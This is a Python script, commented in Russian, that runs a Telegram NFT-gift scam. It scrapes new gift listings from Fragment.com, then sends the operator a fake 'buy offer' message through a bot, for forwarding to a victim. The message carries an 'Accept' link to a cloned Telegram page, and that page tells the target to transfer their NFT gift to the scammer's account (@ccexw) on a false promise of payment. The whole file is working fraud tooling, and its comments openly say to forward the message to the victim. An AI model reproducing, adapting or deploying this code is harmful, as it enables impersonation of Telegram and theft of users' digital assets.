#!/usr/bin/env python3 # -*- coding: utf-8 -*- """ Telegram Gift Fake Offer Bot Мониторит Fragment.com/gifts, шлет фейковое уведомление в твой чат (TG_CHAT_ID). Ты пересылаешь его жертве. Кнопка "Принять" открывает gift_fake.html с экранами "успешно продан" и "как передать". """ import os import re import json import time import requests from datetime import datetime from dotenv import load_dotenv from urllib.parse import urlencode load_dotenv() # ================= КОНФИГ ================= TG_TOKEN = os.getenv("TG_TOKEN") TG_CHAT_ID = os.getenv("TG_CHAT_ID") FAKE_HTML_URL = os.getenv("FAKE_HTML_URL", "https://твой-домен.com/gift_fake.html") CHECK_INTERVAL = int(os.getenv("CHECK_INTERVAL", "60")) SEEN_FILE = "seen_gifts.json" GIFT_IMG_BASE = os.getenv("GIFT_IMG_BASE", "https://img.icons8.com/color/256/000000/moon.png") FRAGMENT_URL = "https://fragment.com/gifts" # ================= МОНИТОРИНГ FRAGMENT ================= def load_seen(): try: with open(SEEN_FILE, "r", encoding="utf-8") as f: return set(json.load(f)) except Exception: return set() def save_seen(seen): with open(SEEN_FILE, "w", encoding="utf-8") as f: json.dump(list(seen), f, ensure_ascii=False, indent=2) def fetch_new_gifts(): try: resp = requests.get(FRAGMENT_URL, headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html,application/xhtml+xml", }, timeout=15) html = resp.text except Exception as e: print(f"[!] Ошибка запроса к Fragment: {e}") return [] gifts = [] gift_matches = re.findall(r'/gift/([A-Za-z0-9_#-]+)', html) seller_matches = re.findall(r'@([A-Za-z0-9_]{5,32})', html) price_matches = re.findall(r'(\d+(?:\.\d+)?)\s*⭐', html) for i, gift in enumerate(gift_matches[:10]): seller = seller_matches[i] if i < len(seller_matches) else "noname" price = price_matches[i] if i < len(price_matches) else "0" gifts.append({ "gift": gift, "seller": seller, "price": price, "time": datetime.now().strftime("%H:%M:%S") }) return gifts # ================= ОТПРАВКА ФЕЙКОВОГО ОФФЕРА ================= def send_fake_offer(chat_id, gift_name, gift_id, seller_name, price_stars, gift_img_url=None): if not gift_img_url: gift_img_url = GIFT_IMG_BASE caption = ( f"🎁 {gift_name}\n\n" f"Пользователь {seller_name} предлагает Вам " f"{price_stars} ⭐ за подарок\n" f"{gift_id}\n\n" f"{datetime.now().strftime('%H:%M')}" ) params = urlencode({ "img": gift_img_url, "seller": seller_name, "price": price_stars, "gift": gift_id }) accept_url = f"{FAKE_HTML_URL}?{params}" keyboard = { "inline_keyboard": [[ {"text": "Отклонить", "callback_data": "decline"}, {"text": "Принять", "url": accept_url} ]] } try: r = requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto", data={ "chat_id": chat_id, "photo": gift_img_url, "caption": caption, "parse_mode": "HTML", "reply_markup": json.dumps(keyboard) }, timeout=15) return r.json() except Exception as e: print(f"[!] Ошибка отправки в Telegram: {e}") return None # ================= HTML-КЛОН (встроен, сохраняет при запуске) ================= HTML_CLONE = """ Telegram — Moon Pendant #48365
Telegram Сегодня

за подарок MoonPendant#48365
03:15

1000.0⭐
Передать NFT @ccexw

Как передать подарок пользователю:
@s ccexw

Передайте подарок пользователю: @s ccexw.

Нажмите «Передать NFT» и выберите MoonPendant#48365.
3
Подтвердите передачу подарка.
Telegram зафиксирует транзакцию и моментльно зачислит оплату на ваш баланс. Резерв действует 24 часа.
03:15
 """ def save_html_clone(path="gift_fake.html"): with open(path, "w", encoding="utf-8") as f: f.write(HTML_CLONE) print(f"[+] HTML-клон сохранён: {path}") # ================= ОСНОВНОЙ ЦИКЛ ================= def main(): if not TG_TOKEN or not TG_CHAT_ID: print("[!] Установи TG_TOKEN и TG_CHAT_ID в .env") return save_html_clone() seen = load_seen() print(f"[*] Бот запущен. Мониторинг каждые {CHECK_INTERVAL} сек...") print(f"[*] Чат: {TG_CHAT_ID}") print(f"[*] HTML URL: {FAKE_HTML_URL}") print(f"[*] Пересылай сообщения от бота жертве вручную") while True: try: gifts = fetch_new_gifts() for g in gifts: key = f"{g['gift']}:{g['seller']}" if key not in seen: seen.add(key) save_seen(seen) print(f"[{g['time']}] Новый подарок: {g['gift']} от @{g['seller']} за {g['price']} ⭐") res = send_fake_offer( chat_id=TG_CHAT_ID, gift_name=g["gift"], gift_id=g["gift"], seller_name=g["seller"], price_stars=g["price"], gift_img_url=GIFT_IMG_BASE ) if res and res.get("ok"): print(f"[+] Фейк отправлен в твой чат. Перешли его жертве.") else: print(f"[!] Ошибка отправки: {res}") except Exception as e: print(f"[!] Ошибка в цикле: {e}") time.sleep(CHECK_INTERVAL) if __name__ == "__main__": main()
